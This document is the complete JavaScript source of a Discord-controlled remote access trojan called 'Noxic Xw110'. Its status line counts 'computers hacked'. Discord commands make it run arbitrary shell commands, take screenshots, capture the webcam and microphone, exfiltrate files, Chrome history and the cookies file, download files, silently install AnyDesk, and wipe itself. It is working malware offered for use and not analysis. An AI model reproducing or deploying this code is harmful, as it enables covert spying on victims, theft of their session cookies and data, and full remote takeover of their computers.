require('dotenv').config();
const { Client, GatewayIntentBits, ActivityType } = require('discord.js');
const fs = require('fs');
const path = require('path');
const os = require('os');
const screenshot = require('screenshot-desktop');
const NodeWebcam = require('node-webcam');
const mic = require('mic');
const sqlite3 = require('sqlite3').verbose();
const https = require('https');
const { exec } = require('child_process');

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

let sessionChannels = {};
let hackedCount = 0;

// 🔐 Decode token
const decodedToken = Buffer.from(process.env.TOKEN_ENC, 'base64').toString('utf-8');

client.once('ready', async () => {
  const hostname = os.hostname().toLowerCase().replace(/[^a-z0-9]/g, '-');
  const guild = client.guilds.cache.first();
  if (!guild) return;

  const category = await guild.channels.create({ name: `session-${hostname}`, type: 4 });
  const names = {
    sysinfo: '🧠-sysinfo',
    files: '📁-files',
    webcam: '📷-webcam',
    mic: '🎙️-mic',
    screen: '🖥️-screen',
    messages: '📨-messages',
    cookies: '🔐-cookies',
    history: '🌐-history'
  };

  for (const key in names) {
    sessionChannels[key] = await guild.channels.create({ name: names[key], type: 0, parent: category.id });
  }

  hackedCount++;
  client.user.setActivity(`👁️ ${hackedCount} computers hacked`, { type: ActivityType.Watching });

  exec(`msinfo32 /nfo "sysinfo.nfo"`, (err) => {
    if (!err) sessionChannels.sysinfo.send({ content: '🧠 System Info Dump:', files: ['sysinfo.nfo'] });
  });

  console.log(`✅ Bot ready as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const sendTo = (key, content, file) => {
    const ch = sessionChannels[key] || message.channel;
    if (file) ch.send({ content, files: [file] });
    else ch.send(content);
  };

  if (message.content.startsWith('!run ')) {
    const cmd = message.content.slice(5);
    exec(cmd, (err, stdout, stderr) => {
      sendTo('messages', err ? `❌ ${err.message}` : `\`\`\`${stdout || stderr}\`\`\``);
    });
  }

  if (message.content.startsWith('!msg ')) {
    const text = message.content.slice(5);
    exec(`powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('${text}')"`);
    sendTo('messages', '✅ Message sent.');
  }

  if (message.content === '!screenshot') {
    const filePath = 'screen.jpg';
    screenshot({ filename: filePath }).then(() => {
      sendTo('screen', '🖥️ Screenshot:', filePath);
      fs.unlinkSync(filePath);
    });
  }

  if (message.content === '!webcam') {
    const cam = NodeWebcam.create({ width: 640, height: 480 });
    const filePath = 'webcam.jpg';
    cam.capture(filePath, (err) => {
      if (!err) {
        sendTo('webcam', '📷 Webcam:', filePath);
        fs.unlinkSync(filePath);
      }
    });
  }

  if (message.content === '!mic') {
    const filePath = 'mic.wav';
    const micInstance = mic({ rate: '16000', channels: '1' });
    const micStream = micInstance.getAudioStream();
    const output = fs.createWriteStream(filePath);
    micStream.pipe(output);
    micInstance.start();
    sendTo('mic', '🎙️ Recording 10s...');
    setTimeout(() => {
      micInstance.stop();
      setTimeout(() => {
        sendTo('mic', '🎙️ Mic Recording:', filePath);
        fs.unlinkSync(filePath);
      }, 1000);
    }, 10000);
  }

  if (message.content === '!screenrecord') {
    const shots = [];
    for (let i = 0; i < 5; i++) {
      const file = `screen-${Date.now()}-${i}.jpg`;
      await screenshot({ filename: file });
      shots.push(file);
      await new Promise(r => setTimeout(r, 1000));
    }
    shots.forEach(f => {
      sendTo('screen', '🖥️ Frame:', f);
      if (fs.existsSync(f)) fs.unlinkSync(f);
    });
  }

  if (message.content === '!files') {
    const dir = '.';
    try {
      const files = fs.readdirSync(dir);
      sendTo('files', `📁 Files:\n\`\`\`${files.join('\n').slice(0, 1900)}\`\`\``);
    } catch (err) {
      sendTo('files', `❌ ${err.message}`);
    }
  }

  if (message.content.startsWith('!upload')) {
    const file = message.content.replace('!upload', '').trim();
    if (fs.existsSync(file)) sendTo('files', '📁 Uploading:', file);
    else sendTo('files', '❌ File not found.');
  }

  if (message.content === '!download' && message.attachments.size > 0) {
    const attachment = message.attachments.first();
    const filePath = path.join(__dirname, attachment.name);
    const stream = fs.createWriteStream(filePath);
    https.get(attachment.url, (res) => {
      res.pipe(stream);
      stream.on('finish', () => {
        stream.close();
        sendTo('files', `✅ Saved ${attachment.name}`);
      });
    });
  }

  if (message.content === '!history') {
    const src = path.join(process.env.LOCALAPPDATA, 'Google/Chrome/User Data/Default/History');
    const copy = 'history.db';
    fs.copyFileSync(src, copy);
    const db = new sqlite3.Database(copy);
    db.all("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10", [], (err, rows) => {
      if (err) return sendTo('history', '❌ Could not fetch history');
      const output = rows.map(r => `• ${r.title} - ${r.url}`).join('\n');
      sendTo('history', `🌐 Chrome History:\n\`\`\`${output.slice(0, 1900)}\`\`\``);
      db.close(() => fs.unlinkSync(copy));
    });
  }

  if (message.content === '!cookies') {
    const cookieFile = path.join(process.env.LOCALAPPDATA, 'Google/Chrome/User Data/Default/Cookies');
    if (fs.existsSync(cookieFile)) sendTo('cookies', '🔐 Chrome Cookies:', cookieFile);
    else sendTo('cookies', '❌ Cookies not found.');
  }

  if (message.content === '!anydesk') {
    const url = "https://download.anydesk.com/AnyDesk.exe";
    const file = path.join(__dirname, 'AnyDesk.exe');
    const stream = fs.createWriteStream(file);
    https.get(url, res => {
      res.pipe(stream);
      stream.on('finish', () => {
        exec(`"${file}" --silent`);
        sendTo('messages', '✅ AnyDesk installed.');
      });
    });
  }

  if (message.content === '!selfdestruct') {
    sendTo('messages', '💣 Self-destructing...');
    setTimeout(() => {
      fs.rmSync(__dirname, { recursive: true, force: true });
    }, 3000);
  }

  if (message.content === '!help') {
    const help = [
      "📚 **Noxic Xw110 Commands**",
      "`!run <cmd>` – Run terminal command",
      "`!files` – Show folder contents",
      "`!upload <file>` – Upload local file",
      "`!download` – Save uploaded file",
      "`!msg <text>` – Show popup on PC",
      "`!mic` – Record mic",
      "`!screenrecord` – 5 screenshot frames",
      "`!screenshot` – Capture desktop",
      "`!webcam` – Webcam snapshot",
      "`!sysinfo` – Dump full system info",
      "`!history` – Chrome history",
      "`!cookies` – Chrome cookies file",
      "`!anydesk` – Install AnyDesk silently",
      "`!selfdestruct` – Wipe bot folder"
    ].join('\n');
    sendTo('messages', help);
  }
});

client.login(decodedToken);
